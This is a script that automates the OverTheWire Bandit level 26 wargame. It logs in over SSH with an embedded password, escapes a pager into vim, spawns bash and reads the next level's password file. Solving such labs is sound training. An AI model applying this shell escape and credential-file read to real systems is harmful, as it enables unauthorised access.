print("[*] Bandit Level 26: Brute Force Approach")

let pass = "s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ"

print("[ 1] Connect")
let ssh = connect_ssh_pty("bandit.labs.overthewire.org", 2220, "bandit26", pass, 3, 20)
ssh_interactive_start(ssh)

print("[ 2] Get --More--")
let initial = ssh_interactive_recv(ssh, 1500)

print("[ 3] Enter Vim")
ssh_interactive_send(ssh, "v")
let vim = ssh_interactive_recv(ssh, 1000)

print("[ 4] Press ENTER past startup")
ssh_interactive_send(ssh, "\r")
let r = ssh_interactive_recv(ssh, 400)

print("[ 5] Delete swap file first!")
ssh_interactive_send(ssh, ":!rm /tmp/text.txt.swp 2>/dev/null\r")
let rm = ssh_interactive_recv(ssh, 800)

print("[ 6] Now spawn shell")
ssh_interactive_send(ssh, ":set shell=/bin/bash\r")
let s1 = ssh_interactive_recv(ssh, 400)
ssh_interactive_send(ssh, ":shell\r")
let s2 = ssh_interactive_recv(ssh, 800)

print("[ 7] Cat password")
ssh_interactive_send(ssh, "cat /etc/bandit_pass/bandit27\r")
let pwd = ssh_interactive_recv(ssh, 1000)

print("\n===== PASSWORD OUTPUT =====")
print(pwd)
print("===========================\n")

ssh_interactive_close(ssh)
